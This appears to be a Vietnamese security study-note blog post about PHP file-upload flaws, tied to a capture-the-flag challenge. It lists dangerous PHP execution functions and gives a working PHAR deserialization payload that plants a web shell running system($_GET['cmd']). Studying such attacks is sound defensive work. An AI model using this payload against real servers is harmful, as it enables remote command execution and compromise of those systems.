---
layout: post
title: "Vuln Upload In PHP (1)"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - file-upload-vulnerabilities
source_collection: notion_portswigger
---
- **Các hàm thực thi nguy hiểm:**
    
    ```php
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld
    ```
    
- **UpLoad file `PHAR` , sử dụng schema `phar://`để thực thi code php - func loadfile: `get_file_contents`  - PHP/5.6.40**
    
    Để làm được điều này, trước hết tính năng `phar.readonly` trong `php.ini`phải được tắt
    
    ![Untitled](/assets/img/portswigger/vuln-upload-in-php-1/Untitled.png)
    
    **Payload:**
    
    ```php
    <?php
    class Uploader{
        public $Filename;
        public $cmd;
        public $token;
        function __destruct(){
            eval($this->cmd);
    //Khi đối tượng bị hủy (kết thúc vòng đời), 
    //phương thức này sẽ được gọi và thực thi mã được lưu trữ trong $cmd bằng hàm eval().
        } 
    }
    
    $o = new Uploader();
    $o->cmd = 'if (isset($_GET["cmd"])) echo(system($_GET["cmd"]));';#
    $o->token = 'GXYfa597218ecd549cfbdd9a6228d9781cb';
    
    $phar = new Phar("payload.phar"); // Tạo một đối tượng PHAR với tên payload.phar.
    $phar ->startBuffering(); //Bắt đầu bộ đệm để chuẩn bị thêm nội dung vào tệp PHAR.
    $phar -> setStub("<?php __HALT_COMPILER();?");
    // Thiết lập stub, là đoạn mã PHP sẽ được thực thi khi tệp PHAR được chạy. 
    // __HALT_COMPILER(); ngăn PHP tiếp tục phân tích cú pháp phần còn lại của tệp.
    $phar -> setMetadata($o); 
    // Thêm đối tượng $o vào meta-data của tệp PHAR.
    $phar -> addFromString("test.txt","you are hacked");
    // Thêm tệp test.txt vào tệp PHAR với nội dung "you are hacked".
    $phar -> stopBuffering();
    // Dừng bộ đệm và ghi tất cả dữ liệu vào tệp PHAR.
    ?>
    ```
    
    Đoạn mã này tạo một tệp `payload.phar` chứa một đối tượng `Uploader` với thuộc tính `cmd` được thiết lập để thực thi mã PHP khi đối tượng bị hủy (destructed)
    
    Write Up sử dụng payload này tại [đây](https://www.notion.so/PHP-5-6-40-Upload-file-PHAR-to-execute-Php-Code-GXYCTF2019-BabysqliV3-0-f101a3acbebf4f6589b63b6d4efcb210?pvs=21)
    
- **Sử dụng scheme `php://` để đọc file - func loadfile: `get_file_contents`  - PHP/5.6.40**
